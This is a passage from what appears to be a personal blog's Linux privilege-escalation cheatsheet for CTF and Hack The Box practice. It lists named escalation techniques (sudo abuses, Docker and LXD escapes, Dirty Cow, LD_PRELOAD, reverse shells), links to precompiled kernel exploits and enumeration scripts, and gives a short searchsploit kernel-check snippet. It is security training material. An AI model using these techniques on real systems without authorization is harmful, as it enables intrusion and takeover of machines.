+</code></pre></div></div><ul><li>[[LinPeas]]</li><li>[[Enum4Linux]] for SMB</li><li><a href="https://github.com/diego-treitos/linux-smart-enumeration">GitHub - diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels</a></li><li>https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</li></ul><h1 id="pivoting-and-lateral-movement"> Pivoting and lateral movement <a href="#pivoting-and-lateral-movement">#</a></h1><ul><li>[[SSH Tunnels]]</li><li>Linux [[Reverse Shell]]</li></ul><h1 id="privilege-escalation"> Privilege Escalation <a href="#privilege-escalation">#</a></h1><ul><li>[[Overlay FS Exploit]]</li><li>[[Strange home permission]]</li><li>[[Python import privesc]]</li><li>[[Python sudo inside HOME]]</li><li>[[Python pip3 sudo install]]</li><li>[[Python library hijacking]]</li><li>[[Python Deserialization Attack]]</li><li>[[Path Manipulation (Hijacking)]]</li><li>[[Sudo bin bash]]</li><li>[[Sudo less]]</li><li>[[Sudo SETENV privesc]]</li><li>[[Sudoedit - wildcard processing]]</li><li>[[Misconfigured systemd]]</li><li>[[Wildcard Injection]]</li><li>[[Dropping to root via Yum custom plugin]]</li><li>[[Magical SUID bash]]</li><li>[[Privesc using Metasploit]]</li><li>[[Annoying shell]]</li><li>[[Inspecting binaries]]</li><li>[[NFS no_root_squash]]</li><li>[[Privesc using sudo flask run]]</li><li>[[Openssl cap_setuid]]</li><li>[[Dirty Cow Exploit]]</li><li>[[Apport and Abrt exploit]]</li><li>[[LD_PRELOAD]]</li><li>[[Bypassing random function]]</li><li>[[Java JAR Evil privesc]]</li><li>[[Gitea post hook]]</li><li>[[Docker - shared volume]]</li><li>[[Docker - image mount]]</li><li>[[Docker - SYS_MODULE]]</li><li>[[Docker - SYS_ADMIN]]</li><li>[[LXD - Image import]]</li><li>[[Restricted Shell Bypass]]</li><li>[[Appending to passwd]]</li></ul><h1 id="kernel-exploits"> Kernel Exploits <a href="#kernel-exploits">#</a></h1><p><strong>TIP</strong> If kernel version is very old, its most likely that there will be a lot of exploits available. Eg. <code class="language-plaintext highlighter-rouge">3.X</code> and <code class="language-plaintext highlighter-rouge">2.X</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kernel exploits?</span>
+<span class="o">(</span><span class="nb">cat</span> /proc/version <span class="o">||</span> <span class="nb">uname</span> <span class="nt">-a</span><span class="o">)</span>
+searchsploit Linux Kernel
+searchsploit Linux Kernel 4.15
+
+<span class="c"># check</span>
+bash linux-exploit-suggester.sh
+</code></pre></div></div><ul><li>[[Dirty Cow Exploit]]</li></ul><p><strong>Others</strong></p><ul><li><a href="https://github.com/anoaghost/Localroot_Compile">Some precompiled exploits</a></li><li><a href="https://github.com/lucyoa/kernel-exploits">GitHub - lucyoa/kernel-exploits</a></li></ul><h1 id="still-stuck"> Still Stuck? <a href="#still-stuck">#</a></h1><ul><li>No process running as root? Its ok, it might be namespaced. Still try exploits on apps. Example: In HTB horizontall, all processes are running as <code class="language-plaintext highlighter-rouge">strapi</code> but when I tried [[Laravel]] RCE exploit I was able to escalate to root.</li></ul><h1 id="references"> References <a href="#references">#</a></h1><ul><li><a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist">Checklist - Linux Privilege Escalation - HackTricks</a></li><li><a href="https://github.com/frizb/Linux-Privilege-Escalation">GitHub - frizb/Linux-Privilege-Escalation: Tips and Tricks for Linux Priv Escalation</a></li><li><a href="https://bluehood.github.io/shellcode/3-2-entry.html">SETUID Shell Shellcode</a></li><li>[[GTFOBins - Bypassing Linux Restrictions]]</li><li><a href="https://github.com/isch1zo/Linux-PrivEsc-cheatsheat">GitHub - isch1zo/Linux-PrivEsc-cheatsheat: Hi There today I published a checklist of strategies on Linux Privilege Escalation by Tib3rius</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">PayloadsAllTheThings/Linux - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings · GitHub</a></li></ul></section><section><nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/2019/08/31/difference-between-font-formats"><div class="nav-arrow">Previous</div><span class="post-title">Difference between font formats</span> </a> <a class="post-nav-item post-nav-next" href="/2021/12/16/padding-oracle-attack"><div class="nav-arrow">Next</div><span class="post-title">Padding Oracle Attack</span> </a></nav></section><div id="disqus_thread" class="article-comments"></div><script> (function() { var d = document, s = d.createElement('script'); s.src = '//powex.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></main><script> function setTheme(theme) { if (theme === "dark") { document.documentElement.setAttribute('data-theme', 'dark'); window.localStorage.setItem('theme', 'dark'); document.getElementById("theme-toggle").classList.add('sun'); document.getElementById("theme-toggle").classList.remove('moon'); } else { document.documentElement.setAttribute('data-theme', 'light'); window.localStorage.setItem('theme', 'light'); document.getElementById("theme-toggle").classList.add('moon'); document.getElementById("theme-toggle").classList.remove('sun'); } } let theme = localStorage.getItem('theme'); theme = theme || (window.matchMedia ? window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light' : 'light'); setTheme(theme); function modeSwitcher() { let currentMode = document.documentElement.getAttribute('data-theme'); if (currentMode === "dark") { setTheme('light'); } else { setTheme('dark'); } } </script></body><footer class="social-footer"><div class="social-footer-icons"> <a href="https://github.com/P0WEX" title="Github profile, nothing much there, yet" target="_blank" rel="noopener noreferrer"><i class="fa fa-github" aria-hidden="true"></i></a> <a href="/atom.xml" title="Feed RSS" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss" aria-hidden="true"></i></a> <a href="https://github.com/P0WEX/Gesko" title="Browse the code" target="_blank" rel="noopener noreferrer"><i class="fa fa-code" aria-hidden="true"></i></a></div></footer></html>
